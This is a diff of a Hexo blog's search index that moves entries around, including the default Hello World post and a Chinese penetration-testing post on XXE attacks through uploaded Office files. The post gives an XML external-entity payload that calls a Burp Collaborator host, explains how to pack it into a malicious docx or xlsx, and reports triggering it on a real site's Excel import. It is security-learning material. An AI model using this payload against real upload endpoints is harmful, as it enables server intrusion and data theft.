@@ -1,51 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2022/03/18/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>通过 Office Open XML 解析器进行XXE攻击</title>
-    <url>/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><h3 id="XXE-via-Office-Open-XML-Parsers"><a href="#XXE-via-Office-Open-XML-Parsers" class="headerlink" title="XXE via Office Open XML Parsers"></a>XXE via Office Open XML Parsers</h3><p>（复制自 <a href="https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/"><strong>here</strong></a>）<br>许多 Web 应用程序允许您上传 Microsoft Office 文档，然后后端会从中解析数据。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要<strong>parse at least one XML file</strong>.</p>
-<p>对此进行测试的唯一方法是生成一个包含 XXE 有效负载的 <strong>Microsoft Office 文件</strong>，所以让我们这样做。<br>首先，创建一个空目录来解压你的文档，然后解压！</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test$ ls</span><br><span class="line">test.docx</span><br><span class="line">test$ mkdir unzipped</span><br><span class="line">test$ unzip ./test.docx -d ./unzipped/</span><br><span class="line">Archive:  ./test.docx</span><br><span class="line">  inflating: ./unzipped/word/numbering.xml</span><br><span class="line">  inflating: ./unzipped/word/settings.xml</span><br><span class="line">  inflating: ./unzipped/word/fontTable.xml</span><br><span class="line">  inflating: ./unzipped/word/styles.xml</span><br><span class="line">  inflating: ./unzipped/word/document.xml</span><br><span class="line">  inflating: ./unzipped/word/_rels/document.xml.rels</span><br><span class="line">  inflating: ./unzipped/_rels/.rels</span><br><span class="line">  inflating: ./unzipped/word/theme/theme1.xml</span><br><span class="line">  inflating: ./unzipped/[Content_Types].xml</span><br></pre></td></tr></table></figure>
-
-<p>在您喜欢的文本编辑器 (vim) 中打开 <code>./unzipped/word/document.xml</code> 并编辑 <strong>XML 以包含您喜欢的 XXE 有效负载</strong>。我尝试的第一件事往往是 HTTP 请求，如下所示：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY test SYSTEM &quot;http://[ID].burpcollaborator.net/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这些行应该像这样插入到两个根 XML 对象之间，当然您需要将 URL 替换为可以监视请求的 URL：</p>
-<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png" alt="Those lines should be inserted in between the two root XML objects, like thi"></p>
-<p>剩下的就是<strong>压缩文件以创建恶意的 poc.docx 文件</strong>。从我们之前创建的“解压缩”目录中，运行以下命令：</p>
-<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png" alt="From the &quot;unzipped&quot; directory that we created earlier, run the following:"></p>
-<p>现在将文件上传到易受攻击的 Web 应用程序，并在 Burp Collaborator 日志监控是否收到请求。</p>
-<h2 id="0x02-通过上传Excel对网站进行XXE攻击"><a href="#0x02-通过上传Excel对网站进行XXE攻击" class="headerlink" title="0x02-通过上传Excel对网站进行XXE攻击"></a>0x02-通过上传Excel对网站进行XXE攻击</h2><h3 id="0x02-1-确认XXE"><a href="#0x02-1-确认XXE" class="headerlink" title="0x02-1 确认XXE"></a>0x02-1 确认XXE</h3><p>某次对项目网站进行测试，发现应用系统中提供多个上传接口，允许用户上传 Excel 文件并在后端对 Excel 文件进行数据解析导入。<br>根据 <code>0x01-前言</code> 提及的方法，对 Excel 解压，修改文件XML内容。第一次修改的文件为 <code>[Content_Types].xml</code> ，修改后重压缩文件为 xsls 文件并上传，测试后现XXE攻击失败。<br>后续将 <code>xl/workbook.xml</code>、<code>xl/worksheets/sheet1.xml</code>、<code>xl/theme/theme1.xml</code>的内容均作修改，插入 XXE PayLoad。重新上传修改后的 xsls 文件，成功触发 XXE漏洞。</p>
-<h3 id="0x02-2-读取文件"><a href="#0x02-2-读取文件" class="headerlink" title="0x02-2 读取文件"></a>0x02-2 读取文件</h3><p>还没来得及测试，对方已修复漏洞，bingo！！！</p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>XXE</tag>
-        <tag>文件上传</tag>
-        <tag>WEB安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ThinkPHP反序列化漏洞-1</title>
     <url>/2022/03/18/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/</url>
     <content><![CDATA[<h2 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01-搭建环境"></a>0x01-搭建环境</h2><p>详见前文</p>
@@ -88,10 +43,55 @@
         <category>PHP</category>
       </categories>
       <tags>
-        <tag>WEB安全</tag>
         <tag>PHP</tag>
         <tag>反序列化</tag>
         <tag>ThinkPHP反序列化漏洞</tag>
+        <tag>WEB安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2022/03/18/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>通过 Office Open XML 解析器进行XXE攻击</title>
+    <url>/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><h3 id="XXE-via-Office-Open-XML-Parsers"><a href="#XXE-via-Office-Open-XML-Parsers" class="headerlink" title="XXE via Office Open XML Parsers"></a>XXE via Office Open XML Parsers</h3><p>（复制自 <a href="https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/"><strong>here</strong></a>）<br>许多 Web 应用程序允许您上传 Microsoft Office 文档，然后后端会从中解析数据。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要<strong>parse at least one XML file</strong>.</p>
+<p>对此进行测试的唯一方法是生成一个包含 XXE 有效负载的 <strong>Microsoft Office 文件</strong>，所以让我们这样做。<br>首先，创建一个空目录来解压你的文档，然后解压！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test$ ls</span><br><span class="line">test.docx</span><br><span class="line">test$ mkdir unzipped</span><br><span class="line">test$ unzip ./test.docx -d ./unzipped/</span><br><span class="line">Archive:  ./test.docx</span><br><span class="line">  inflating: ./unzipped/word/numbering.xml</span><br><span class="line">  inflating: ./unzipped/word/settings.xml</span><br><span class="line">  inflating: ./unzipped/word/fontTable.xml</span><br><span class="line">  inflating: ./unzipped/word/styles.xml</span><br><span class="line">  inflating: ./unzipped/word/document.xml</span><br><span class="line">  inflating: ./unzipped/word/_rels/document.xml.rels</span><br><span class="line">  inflating: ./unzipped/_rels/.rels</span><br><span class="line">  inflating: ./unzipped/word/theme/theme1.xml</span><br><span class="line">  inflating: ./unzipped/[Content_Types].xml</span><br></pre></td></tr></table></figure>
+
+<p>在您喜欢的文本编辑器 (vim) 中打开 <code>./unzipped/word/document.xml</code> 并编辑 <strong>XML 以包含您喜欢的 XXE 有效负载</strong>。我尝试的第一件事往往是 HTTP 请求，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY test SYSTEM &quot;http://[ID].burpcollaborator.net/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这些行应该像这样插入到两个根 XML 对象之间，当然您需要将 URL 替换为可以监视请求的 URL：</p>
+<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png" alt="Those lines should be inserted in between the two root XML objects, like thi"></p>
+<p>剩下的就是<strong>压缩文件以创建恶意的 poc.docx 文件</strong>。从我们之前创建的“解压缩”目录中，运行以下命令：</p>
+<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png" alt="From the &quot;unzipped&quot; directory that we created earlier, run the following:"></p>
+<p>现在将文件上传到易受攻击的 Web 应用程序，并在 Burp Collaborator 日志监控是否收到请求。</p>
+<h2 id="0x02-通过上传Excel对网站进行XXE攻击"><a href="#0x02-通过上传Excel对网站进行XXE攻击" class="headerlink" title="0x02-通过上传Excel对网站进行XXE攻击"></a>0x02-通过上传Excel对网站进行XXE攻击</h2><h3 id="0x02-1-确认XXE"><a href="#0x02-1-确认XXE" class="headerlink" title="0x02-1 确认XXE"></a>0x02-1 确认XXE</h3><p>某次对项目网站进行测试，发现应用系统中提供多个上传接口，允许用户上传 Excel 文件并在后端对 Excel 文件进行数据解析导入。<br>根据 <code>0x01-前言</code> 提及的方法，对 Excel 解压，修改文件XML内容。第一次修改的文件为 <code>[Content_Types].xml</code> ，修改后重压缩文件为 xsls 文件并上传，测试后现XXE攻击失败。<br>后续将 <code>xl/workbook.xml</code>、<code>xl/worksheets/sheet1.xml</code>、<code>xl/theme/theme1.xml</code>的内容均作修改，插入 XXE PayLoad。重新上传修改后的 xsls 文件，成功触发 XXE漏洞。</p>
+<h3 id="0x02-2-读取文件"><a href="#0x02-2-读取文件" class="headerlink" title="0x02-2 读取文件"></a>0x02-2 读取文件</h3><p>还没来得及测试，对方已修复漏洞，bingo！！！</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>WEB安全</tag>
+        <tag>XXE</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
